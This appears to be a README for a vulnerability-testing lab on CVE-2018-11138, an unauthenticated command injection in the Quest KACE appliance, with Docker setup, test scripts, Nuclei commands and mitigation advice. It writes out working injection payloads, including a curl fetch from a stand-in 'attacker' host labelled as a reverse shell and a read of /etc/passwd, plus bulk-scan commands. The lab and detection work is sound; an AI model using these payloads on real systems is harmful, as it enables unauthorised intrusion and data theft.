# CVE-2018-11138 - Quest KACE System Management Appliance RCE

## Vulnerability Overview

**CVE ID:** CVE-2018-11138  
**Severity:** Critical (CVSS 9.8)  
**Affected Version:** Quest KACE System Management Appliance 8.0.318  
**Vulnerability Type:** Remote Code Execution (RCE)  

## Description

The `/common/download_agent_installer.php` script in the Quest KACE System Management Appliance 8.0.318 is accessible by anonymous users and can be abused to execute arbitrary commands on the system. This vulnerability allows unauthenticated attackers to execute shell commands with the privileges of the web server user.

## Technical Details

### Attack Vector
- **Endpoint:** `/common/download_agent_installer.php`
- **Method:** POST
- **Authentication:** None required
- **Parameter:** `custom_install_options` (command injection)

### Payload Structure
```
POST /common/download_agent_installer.php
Content-Type: application/x-www-form-urlencoded

platform=linux&custom_install_options=;COMMAND;echo+
```

## Testing Environment Setup

### Option 1: Using Docker (Recommended)

1. **Build and run the vulnerable environment:**
   ```bash
   cd code/cves/2018/CVE-2018-11138
   docker-compose up -d
   ```

2. **Verify the environment is running:**
   ```bash
   curl http://localhost:8080
   ```

3. **Test with Nuclei:**
   ```bash
   # From the nuclei-templates root directory
   nuclei -u http://localhost:8080 -t http/cves/2018/CVE-2018-11138.yaml -debug
   ```

### Option 2: Manual Testing

1. **Using curl:**
   ```bash
   curl -X POST http://localhost:8080/common/download_agent_installer.php \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "platform=linux&custom_install_options=;id;echo+"
   ```

2. **Using the Python test script:**
   ```bash
   cd code/cves/2018/CVE-2018-11138
   python3 test-payloads.py http://localhost:8080
   ```

3. **Using the Bash test script:**
   ```bash
   # From the nuclei-templates root directory
   bash code/cves/2018/CVE-2018-11138/test-template.sh http://localhost:8080
   ```

## Testing Scripts

### Python Test Script (`test-payloads.py`)
The Python script provides comprehensive testing with multiple payloads:

```bash
python3 test-payloads.py <target_url>
```

**Features:**
- Basic Quest KACE detection
- Multiple command injection payloads
- Automatic vulnerability confirmation
- Clean output format

**Example output:**
```
============================================================
CVE-2018-11138 - Quest KACE RCE Vulnerability Tester
============================================================
Target: http://localhost:8080

[+] Testing basic detection...
[+] Target appears to be Quest KACE system

Testing vulnerability payloads...
----------------------------------------
[+] Testing payload: ;id;echo+
[+] Request successful (Status: 200)
[+] VULNERABLE! Command execution detected!

============================================================
[!] VULNERABILITY CONFIRMED!
[!] The target is vulnerable to CVE-2018-11138
[!] Immediate action required to patch the system
============================================================
```

### Bash Test Script (`test-template.sh`)
The bash script provides comprehensive testing including Nuclei template validation:

```bash
# Must be run from nuclei-templates root directory
bash code/cves/2018/CVE-2018-11138/test-template.sh <target_url>
```

**Features:**
- Target reachability check
- Template existence verification
- Basic Quest KACE detection
- Manual vulnerability testing
- Nuclei template testing with Interactsh
- Debug output capture

**Example output:**
```
========================================
CVE-2018-11138 - Quest KACE RCE Tester
========================================
Target: http://localhost:8080
Template: http/cves/2018/CVE-2018-11138.yaml

[+] Starting CVE-2018-11138 vulnerability test

[+] Checking if target is reachable...
[+] Target is reachable
[+] Checking if template exists...
[+] Template found: http/cves/2018/CVE-2018-11138.yaml

[+] Testing basic detection...
[+] Quest KACE system detected

[+] Testing vulnerable endpoint manually...
[*] Sending payload: ;id;echo+
[+] VULNERABLE! Command execution detected

[+] Running Nuclei template test...
[+] Nuclei detected the vulnerability!
```

## Nuclei Template Testing

### Basic Test
```bash
nuclei -u http://target:80 -t http/cves/2018/CVE-2018-11138.yaml
```

### Debug Mode
```bash
nuclei -u http://target:80 -t http/cves/2018/CVE-2018-11138.yaml -debug -v
```

### Bulk Testing
```bash
nuclei -l targets.txt -t http/cves/2018/CVE-2018-11138.yaml -o results.txt
```

## Expected Results

### Positive Detection
- Nuclei will detect the vulnerability if the target is vulnerable
- Interactsh callback will be received confirming command execution
- HTTP 200 response from the vulnerable endpoint

### Debug Output
```
[INF] [CVE-2018-11138] Dumped HTTP request for http://target:80/common/download_agent_installer.php
[INF] [CVE-2018-11138] Dumped HTTP response for http://target:80/common/download_agent_installer.php
[INF] [CVE-2018-11138] Interactsh callback received: http://callback-url
```

## Payload Examples

### Basic Command Execution
```
platform=linux&custom_install_options=;id;echo+
```

### Reverse Shell (if curl available)
```
platform=linux&custom_install_options=;curl+http://attacker:4444/shell;echo+
```

### File Read
```
platform=linux&custom_install_options=;cat+/etc/passwd;echo+
```

### Network Reconnaissance
```
platform=linux&custom_install_options=;netstat+-an;echo+
```

## Quick Test Commands

### 1. Start Environment
```bash
cd code/cves/2018/CVE-2018-11138
docker-compose up -d
```

### 2. Test with Curl
```bash
curl -X POST http://localhost:8080/common/download_agent_installer.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "platform=linux&custom_install_options=;id;echo+" | grep -A 5 -B 5 "uid="
```

### 3. Test with Python
```bash
cd code/cves/2018/CVE-2018-11138
python3 test-payloads.py http://localhost:8080
```

### 4. Test with Bash Script
```bash
# From nuclei-templates root directory
bash code/cves/2018/CVE-2018-11138/test-template.sh http://localhost:8080
```

### 5. Test with Nuclei
```bash
# From nuclei-templates root directory
nuclei -u http://localhost:8080 -t http/cves/2018/CVE-2018-11138.yaml -debug
```

## Mitigation

1. **Immediate Actions:**
   - Restrict access to `/common/download_agent_installer.php`
   - Implement proper authentication for all administrative endpoints
   - Apply input validation and sanitization

2. **Long-term Solutions:**
   - Upgrade to the latest version of Quest KACE System Management Appliance
   - Implement proper access controls and authentication
   - Regular security assessments and penetration testing

## References

- [Core Security Advisory](https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities)
- [Exploit-DB](https://www.exploit-db.com/exploits/44950/)
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-11138)
- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11138)

## Files Included

- `Dockerfile` - Vulnerable environment setup
- `docker-compose.yml` - Easy deployment
- `test-payloads.py` - Python testing script
- `test-template.sh` - Bash testing script
- `debug-output.txt` - Sample debug output
- `vulnerable-app/` - Simple vulnerable PHP application for testing

## Disclaimer

This template and testing environment are provided for educational and authorized security testing purposes only. Always ensure you have proper authorization before testing any systems. 